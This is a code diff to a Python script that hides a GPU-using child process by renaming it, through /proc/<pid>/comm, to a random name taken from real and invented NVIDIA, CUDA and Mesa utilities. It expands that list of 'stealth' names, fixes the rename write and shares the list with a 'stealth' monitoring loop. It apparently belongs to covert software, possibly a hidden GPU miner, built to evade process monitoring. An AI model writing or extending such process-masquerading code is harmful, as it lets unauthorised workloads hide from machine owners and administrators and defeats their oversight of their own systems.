@@ -162,7 +162,15 @@ def main():
                 "glxgears",             # OpenGL test utility
                 "vulkan-info",          # Vulkan system info
                 "mesa-loader",          # Mesa graphics loader
-                "drm-tip"               # Direct Rendering Manager
+                "drm-tip",              # Direct Rendering Manager
+                "tensor-core",          # NVIDIA Tensor core utility
+                "cuda-drvr",            # CUDA driver helper
+                "nv-compiler",          # NV compiler service
+                "opencl-wkr",           # OpenCL worker thread
+                "cudnn-help",           # cuDNN helper
+                "nvrm-daemon",          # NVIDIA RM daemon
+                "gpu-sched",            # GPU scheduler service
+                "cuda-ipc"              # CUDA IPC handler
             ]
         )
         
@@ -221,11 +229,15 @@ def main():
                 stealth_names = [
                     "nvidia-smi", "cuda-gdb", "nvcc", "nvidia-ml-py", 
                     "nvidia-settings", "gpu-manager", "glxgears", 
-                    "vulkan-info", "mesa-loader", "drm-tip"
+                    "vulkan-info", "mesa-loader", "drm-tip",
+                    "tensor-core", "cuda-drvr", "nv-compiler", "opencl-wkr",
+                    "cudnn-help", "nvrm-daemon", "gpu-sched", "cuda-ipc"
                 ]
                 new_name = random.choice(stealth_names)[:15]
-                with open(f"/proc/{process.pid}/comm", "w") as comm_file:
-                    comm_file.write(new_name + "\n")
+                # /proc/<pid>/comm expects <=15 bytes, no newline
+                safe_name = new_name.encode("utf-8")[:15].decode("utf-8", errors="ignore")
+                with open(f"/proc/{process.pid}/comm", "w", encoding="utf-8") as comm_file:
+                    comm_file.write(safe_name)
                 logger.info(f"✅ [GPU-POST-EXEC-STEALTH] Renamed child PID {process.pid} to '{new_name}'")
                 # Publish real PID to EventBus so other modules can target it
                 try:
@@ -246,11 +258,8 @@ def main():
             # 🔒 PHASE 2: Enhanced GPU Resource Monitoring + Stealth - Dựa trên patterns từ resource_control.py
             def maintain_gpu_subprocess_stealth():
                 """Enhanced GPU monitoring với resource conflict detection"""
-                gpu_stealth_names = [
-                    "nvidia-smi", "cuda-gdb", "nvcc", "nvidia-ml-py", 
-                    "nvidia-settings", "gpu-manager", "glxgears", 
-                    "vulkan-info", "mesa-loader", "drm-tip"
-                ]
+                # Reuse same stealth_names list to ensure consistency
+                gpu_stealth_names = stealth_names
                 
                 resource_error_count = 0  # Track consecutive errors
                 max_errors = 3           # Threshold để emergency handling
